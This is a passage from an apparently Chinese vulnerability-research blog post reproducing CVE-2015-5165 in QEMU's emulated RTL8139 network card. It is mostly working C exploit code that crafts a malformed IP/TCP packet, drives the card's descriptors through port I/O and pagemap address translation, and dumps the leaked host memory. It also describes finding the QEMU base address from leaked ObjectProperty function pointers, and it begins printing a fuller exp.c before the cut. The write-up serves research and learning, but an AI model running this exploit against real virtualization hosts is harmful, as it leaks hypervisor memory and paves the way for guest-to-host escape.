endian</span></span><br><span class="line"><span class="comment">// ethernet frame</span></span><br><span class="line"><span class="keyword">uint8_t</span> packet[] = &#123;</span><br><span class="line">    <span class="comment">/* 以太网帧 */</span></span><br><span class="line">    <span class="comment">// dst</span></span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x57</span>,</span><br><span class="line">    <span class="comment">// src</span></span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x57</span>,</span><br><span class="line">    <span class="comment">// 类型(代表IP协议)</span></span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x00</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* IP数据报 */</span></span><br><span class="line">    <span class="comment">// 版本和首部长度</span></span><br><span class="line">    (<span class="number">0x4</span> &lt;&lt; <span class="number">4</span>) | <span class="number">0x5</span>,</span><br><span class="line">    <span class="comment">// TOS</span></span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// 总长度</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x13</span>,</span><br><span class="line">    <span class="comment">// 标识</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,</span><br><span class="line">    <span class="comment">// 标志(3bit)和片偏移(以8为基本单位，也就是相当于把标志的3bit当做0来计算)</span></span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// TTL</span></span><br><span class="line">    <span class="number">0x40</span>,</span><br><span class="line">    <span class="comment">// 上层协议，代表TCP</span></span><br><span class="line">    <span class="number">0x06</span>,</span><br><span class="line">    <span class="comment">// 首部校验和</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,</span><br><span class="line">    <span class="comment">// 源IP</span></span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="comment">// 目的IP</span></span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* TCP数据报 */</span></span><br><span class="line">    <span class="comment">// 源端口</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,</span><br><span class="line">    <span class="comment">// 目的端口</span></span><br><span class="line">    <span class="number">0xbe</span>, <span class="number">0xef</span>,</span><br><span class="line">    <span class="comment">// Sequence Number</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// Acknowledgement Number</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// 报头长度等</span></span><br><span class="line">    <span class="number">0x50</span>,</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="number">0x10</span>,</span><br><span class="line">    <span class="comment">// Window size</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xed</span>,</span><br><span class="line">    <span class="comment">// TCP checksum</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,</span><br><span class="line">    <span class="comment">// Urgent pointer</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 Rx/Tx descriptor</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> dw0;</span><br><span class="line">    <span class="keyword">uint32_t</span> dw1;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_lo;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_hi;</span><br><span class="line">&#125;rtl8139_desc;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 Rx/Tx ring</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_ring</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span> *<span class="title">desc</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *buffer;</span><br><span class="line">&#125;rtl8139_ring;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gpa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="keyword">size_t</span> offset;</span><br><span class="line">    offset = ((<span class="keyword">uint64_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PAGE_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PAGE_PFN;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | ((<span class="keyword">uint64_t</span>)addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_writeb</span><span class="params">(<span class="keyword">uint32_t</span> data, <span class="keyword">uint32_t</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outb(data, PMIO_BASE+port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_writew</span><span class="params">(<span class="keyword">uint32_t</span> data, <span class="keyword">uint32_t</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outw(data, PMIO_BASE+port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_writel</span><span class="params">(<span class="keyword">uint32_t</span> data, <span class="keyword">uint32_t</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outl(data, PMIO_BASE+port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_readb</span><span class="params">(<span class="keyword">uint32_t</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)inb(PMIO_BASE+port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_readw</span><span class="params">(<span class="keyword">uint32_t</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)inw(PMIO_BASE+port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_readl</span><span class="params">(<span class="keyword">uint32_t</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)inl(PMIO_BASE+port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_rx</span><span class="params">(rtl8139_ring *ring, rtl8139_desc *desc, <span class="keyword">size_t</span> nb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> buffer_size = RTL8139_BUFFER_SIZE + <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nb; ++i) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;desc[i], <span class="number">0</span>, <span class="keyword">sizeof</span>(desc[i]));</span><br><span class="line">        ring[i].desc = &amp;desc[i];</span><br><span class="line">        ring[i].buffer = aligned_alloc(PAGE_SIZE, buffer_size);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">memset</span>(ring[i].buffer, <span class="number">0</span>, buffer_size);</span><br><span class="line"></span><br><span class="line">        ring[i].desc-&gt;dw0 |= CP_RX_OWN;</span><br><span class="line">        ring[i].desc-&gt;dw0 |= buffer_size;</span><br><span class="line">        ring[i].desc-&gt;buf_lo = (<span class="keyword">uint32_t</span>)gva_to_gpa(ring[i].buffer);</span><br><span class="line">        <span class="comment">// printf(&quot;buffer[%d]: 0x%x\n&quot;, i, ring[i].desc-&gt;buf_lo);  // for debug</span></span><br><span class="line">    &#125;</span><br><span class="line">    pmio_writel((<span class="keyword">uint32_t</span>)gva_to_gpa(desc), RxRingAddrLO);</span><br><span class="line">    pmio_writel(<span class="number">0</span>, RxRingAddrHI);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_tx</span><span class="params">(rtl8139_desc *desc, <span class="keyword">void</span> *buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(desc, <span class="number">0</span>, <span class="keyword">sizeof</span>(rtl8139_desc));</span><br><span class="line">    desc-&gt;dw0 |= CP_TX_OWN  |</span><br><span class="line">                 CP_TX_EOR  |</span><br><span class="line">                 CP_TX_LS   |</span><br><span class="line">                 CP_TX_IPCS |</span><br><span class="line">                 CP_TX_TCPCS|</span><br><span class="line">                 CP_TX_LGSEN;</span><br><span class="line">    desc-&gt;dw0 |= RTL8139_BUFFER_SIZE;</span><br><span class="line">    desc-&gt;buf_lo = (<span class="keyword">uint32_t</span>)gva_to_gpa(buffer);</span><br><span class="line">    pmio_writel((<span class="keyword">uint32_t</span>)gva_to_gpa(desc), TxAddr0);</span><br><span class="line">    pmio_writel(<span class="number">0</span>, TxAddr0+<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_card_config</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pmio_writel(TxLoopBack, TxConfig);</span><br><span class="line">    pmio_writel(AcceptMyPhys, RxConfig);</span><br><span class="line">    pmio_writew(CPlusRxEnb|CPlusTxEnb, CpCmd);</span><br><span class="line">    pmio_writeb(CmdRxEnb|CmdTxEnb, ChipCmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_packet_send</span><span class="params">(<span class="keyword">void</span> *buffer, <span class="keyword">void</span> *packet, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= RTL8139_BUFFER_SIZE) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(buffer, packet, len);</span><br><span class="line">        pmio_writeb(<span class="number">1</span>&lt;&lt;<span class="number">6</span>, TxPoll);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxd</span><span class="params">(<span class="keyword">uint8_t</span> *ptr, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; size; ++i, ++j) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">16</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n0x%08x: &quot;</span>, (<span class="keyword">uint32_t</span>)(ptr+i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, ptr[i]);</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">7</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;- &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 44*1500 = 66000 &gt; ip_data_len = 65535</span></span><br><span class="line">    <span class="keyword">size_t</span> rtl8139_rx_nb = <span class="number">44</span>;</span><br><span class="line">    rtl8139_ring *rtl8139_rx_ring;</span><br><span class="line">    rtl8139_desc *rtl8139_rx_desc, *rtl8139_tx_desc;</span><br><span class="line"></span><br><span class="line">    rtl8139_rx_ring = (rtl8139_ring *)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, rtl8139_rx_nb*<span class="keyword">sizeof</span>(rtl8139_ring)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    rtl8139_rx_desc = (rtl8139_desc *)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, rtl8139_rx_nb*<span class="keyword">sizeof</span>(rtl8139_desc)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    rtl8139_tx_desc = (rtl8139_desc *)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, <span class="keyword">sizeof</span>(rtl8139_desc)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *rtl8139_tx_buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);</span><br><span class="line">    iopl(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    rtl8139_desc_config_rx(rtl8139_rx_ring, rtl8139_rx_desc, rtl8139_rx_nb);</span><br><span class="line">    rtl8139_desc_config_tx(rtl8139_tx_desc, rtl8139_tx_buffer);</span><br><span class="line">    rtl8139_card_config();</span><br><span class="line">    rtl8139_packet_send(rtl8139_tx_buffer, packet, <span class="keyword">sizeof</span>(packet));</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rtl8139_rx_nb; ++i) &#123;</span><br><span class="line">    <span class="comment">// for (int i = 0; i &lt; 2; ++i) &#123;</span></span><br><span class="line">        xxd((<span class="keyword">uint8_t</span> *)rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>原文章[2]中通过这个漏洞获得了<code>qemu-system-x86_64</code>进程加载的基址，和为客户机所MMAP的内存基址。在我的复现环境中未能得到虚拟机内存的基址。下面说一下获得text基址的方法和我所做的一些尝试。</p><p>文章[2]在泄露的信息中搜索保存了<code>ObjectProperty</code>对象的堆块（可能是被释放的堆块），通过读取<code>ObjectProperty</code>中所保存的函数指针来泄露<code>qemu-system-x86_64</code>的基地址。</p><p>泄露的数据如下图：</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20201205161404250.png" alt="image-20201205161404250"></p><p>此时进程<code>vmmap</code>如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x555555554000     0x5555555f2000 r--p    9e000 0      qemu-system-x86_64</span><br><span class="line">0x5555555f2000     0x5555559c9000 r-xp   3d7000 9e000  qemu-system-x86_64</span><br><span class="line">0x5555559c9000     0x555555b15000 r--p   14c000 475000 qemu-system-x86_64</span><br><span class="line">0x555555b15000     0x555555be0000 r--p    cb000 5c0000 qemu-system-x86_64</span><br><span class="line">0x555555be0000     0x555555c5e000 rw-p    7e000 68b000 qemu-system-x86_64</span><br><span class="line">0x555555c5e000     0x5555586bc000 rw-p  2a5e000 0      [heap]</span><br><span class="line"># .......    </span><br><span class="line">0x7fff93600000     0x7fffd3600000 rw-p 40000000 0    # MMAPED Memory: 1G</span><br><span class="line"># .......</span><br></pre></td></tr></table></figure><p>我是在泄露的信息中寻找形似函数指针的数据进行验证（在泄露的数据之中搜索<code>55 55 55</code>），验证是否为某函数（其实看函数名字，也就是<code>ObjectProperty</code>中的成员）。</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/qemuleak.png" alt="qemuleak"></p><p>然后使用任意函数低12位地址进行匹配，减去其偏移得到基地址。</p><p>至于客户机内存基地址，在泄露的数据搜索<code>ff 7f</code>，没注意到与<code>0x7fff93600000     0x7fffd3600000 rw-p 40000000 0</code>有强烈关联的地址。而且在我这里，所分配的1G地址空间，低20位为0；网上exploit都是低24位为0的。</p><p><a href="https://github.com/clxsh/CVE/blob/main/CVE-2015-5165/exp.c">exp.c</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 页面相关</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_PRESENT (1ULL &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_PFN ((1ULL &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 PMIO base address</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PMIO_BASE 0xC000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Ethernet Frame</span></span><br><span class="line"><span class="comment">// DST(6) + SRC(6) + Length/Type(2) + MTU(1500)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RTL8139_BUFFER_SIZE 1514</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* w0 ownership flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_OWN (1&lt;&lt;31)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* w0 ownership flag */</span></span><br><span class="line"><span 